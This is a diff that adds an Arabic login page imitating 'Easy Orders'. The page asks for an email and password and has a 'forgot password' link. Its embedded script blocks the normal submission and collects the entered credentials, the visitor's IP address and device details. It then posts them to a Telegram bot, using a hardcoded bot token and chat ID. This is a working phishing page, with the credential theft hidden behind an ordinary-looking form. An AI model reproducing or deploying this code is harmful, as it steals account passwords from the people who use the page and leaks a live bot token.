@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - إيزي أوردرز</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="shortcut icon" href="/fav.png" type="image/x-icon">
+</head>
+
+<body>
+    <div class="login-container">
+        <img src="/logo-ar.png" alt="">
+        <h2>تسجيل الدخول</h2>
+        <form id="login-form" method="post">
+            <label for="email">البريد الإلكتروني</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="password">كلمة السر</label>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <a href="#">نسيت كلمة السر؟</a>
+    </div>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7583235027:AAG0esRzfUwHDA9pbrqehttOuV8QTh1uGL8"; // هنا التوكين              
+        const CHAT_ID = "1374780797"; // هنا معرف الشات
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        // إضافة مستمع للأحداث على الفورم
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // جلب القيم المدخلة
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // جلب عنوان IP الخاص بالمستخدم
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    // معلومات الجهاز
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    // نص الرسالة المرسلة إلى التليجرام
+                    const message = ` 
+                        <b>New Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    // إرسال الرسالة إلى التليجرام
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        alert('تم إرسال المعلومات بنجاح!');
+                    }).catch(error => {
+                        alert('حدث خطأ أثناء الإرسال. حاول مرة أخرى.');
+                    });
+                })
+                .catch(error => {
+                    alert('حدث خطأ أثناء جلب عنوان IP. حاول مرة أخرى.');
+                });
+        });
+    </script>
+</body>
+</html>
